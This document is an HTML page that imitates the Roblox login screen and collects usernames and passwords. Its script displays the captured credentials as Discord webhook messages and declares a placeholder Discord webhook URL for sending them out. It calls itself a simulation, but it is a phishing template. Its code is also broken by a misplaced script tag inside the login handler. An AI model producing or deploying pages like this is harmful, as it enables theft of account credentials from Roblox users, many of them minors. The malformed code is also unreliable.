<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Roblox</title>
  <link rel="icon" href="https://www.roblox.com/favicon.ico" type="image/x-icon">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      font-family: 'Helvetica Neue', sans-serif;
      background-color: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      height: 100vh;
    }

    .container {
      background-color: white;
      width: 400px;
      padding: 40px;
      box-shadow: 0 0 15px rgba(0,0,0,0.2);
      border-radius: 10px;
      text-align: center;
      margin-bottom: 20px;
    }

    .logo img {
      width: 200px;
      margin-bottom: 30px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 14px;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #ff5631;
      color: white;
      border: none;
      border-radius: 6px;
      font-weight: bold;
      font-size: 16px;
      cursor: pointer;
      margin-top: 10px;
    }

    button:hover {
      background-color: #e14a26;
    }

    .discord-log {
      background-color: #2f3136;
      color: #dcddde;
      font-family: 'Segoe UI', sans-serif;
      width: 600px;
      max-height: 300px;
      overflow-y: auto;
      padding: 15px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.5);
    }

    .discord-msg {
      margin-bottom: 12px;
      background-color: #36393f;
      padding: 10px 14px;
      border-radius: 8px;
    }

    .discord-msg .user {
      color: #7289da;
      font-weight: bold;
    }

    .discord-msg .timestamp {
      font-size: 11px;
      color: #aaa;
      margin-left: 5px;
    }

    .discord-msg .content {
      margin-top: 4px;
      white-space: pre-wrap;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/Roblox_Logo_2022.svg" alt="Roblox Logo">
    </div>
    <form onsubmit="handleLogin(event)">
      <input type="text" id="username" placeholder="Username" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>
  </div>

  <div class="discord-log" id="discordLog">
    <!-- Simulated webhook logs appear here -->
  </div>

  <script>
    function handleLogin(e) {
      e.preventDefault();
      const user = document.getElementById("username").value.trim();
      const pass = document.getElementById("password").value;
      const logBox = document.getElementById("discordLog");

      const now = new Date();
      const timeStr = now.toLocaleString();

      const message = `
**ðŸ“¥ Roblox Login Simulation**
**Username:** \`${user}\`
**Password:** \`${pass}\`
**Time:** ${timeStr}
      `.trim();

      const newMsg = document.createElement("div");
      newMsg.classList.add("discord-msg");
      newMsg.innerHTML = `
        <div><span class="user">Webhook Bot</span><span class="timestamp">${timeStr}</span></div>
        <div class="content">${message}</div>
      `;
  <script>
    const webhookURL = "https://discord.com/api/webhooks/REPLACE_WITH_YOURS";
      logBox.prepend(newMsg);

      document.getElementById("username").value = "";
      document.getElementById("password").value = "";
    }
  </script>
</body>
</html>
